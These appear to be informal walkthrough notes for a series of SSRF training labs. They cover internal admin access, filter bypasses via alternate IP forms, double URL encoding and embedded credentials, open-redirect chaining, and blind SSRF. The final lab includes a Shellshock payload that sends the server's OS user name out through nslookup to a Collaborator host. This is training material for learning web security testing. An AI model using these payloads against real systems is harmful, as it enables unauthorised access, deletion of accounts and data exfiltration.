SSRF(Server Side Request Forgery)


Lab: Basic SSRF against the local server
 This lab has a stock check feature which fetches data from an internal system.
 To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 
  
 Browse to /admin and observe that you can't directly access the admin page. 
 Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
 Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.
 Read the HTML to identify the URL to delete the target user, which is:
 http://localhost/admin/delete?username=carlos
 Submit this URL in the stockApi parameter, to deliver the SSRF attack.

Lab: Basic SSRF against another back-end system
 This lab has a stock check feature which fetches data from an internal system.
 To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 
 Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
 Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click "Add §".
 Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
 Click "Start attack".
 Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
 Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos

Lab: SSRF with blacklist-based input filter
 This lab has a stock check feature which fetches data from an internal system.
 To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
 The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 
 
  Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
  Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
  Bypass the block by changing the URL to: http://127.1/
  Change the URL to http://127.1/admin and observe that the URL is blocked again.
  Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.


Lab: SSRF with whitelist-based input filter
 This lab has a stock check feature which fetches data from an internal system.
 To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
 The developer has deployed an anti-SSRF defense you will need to bypass. 
 click on check stock and intercept it then send it to burp repeater.
 change url parameter to  localhost on stockapi it will blocked by whitelist
 Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
 Append a # to the username and observe that the URL is now rejected.
 Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
 To access the admin interface and delete the target user, change the URL to:
 http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos


Lab: SSRF with filter bypass via open redirection vulnerability
 This lab has a stock check feature which fetches data from an internal system.
 To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
 The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 

 intercept check stock and next product and watch nect product is redirecting you to the next page . if you try previously learned technique they all will be failed .. 
 changing path of stock api may not help
 in stock api /product/nextProduct?path=http://192.168.0.12:8080/admin you'll get admin page from this and if ou look into the code that with lead you to the path of deleting carlos.
 Amend the path to delete the target user:
 /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos




Lab: Blind SSRF with out-of-band detection
  This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
 To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server. 
 intercept both home page and view detail
 add burp collaborator on referral the lab will be solved
  Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
 You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. 

Lab: Blind SSRF with Shellshock exploitation
  This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
 To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.


    In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
    Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
    Browse the site.
    Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
    Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
    Send the request to the product page to Burp Intruder.

    Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload:
    () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
    Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
    Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
    Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    Click "Start attack".
    When the attack is finished, go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
    To complete the lab, enter the name of the OS user.


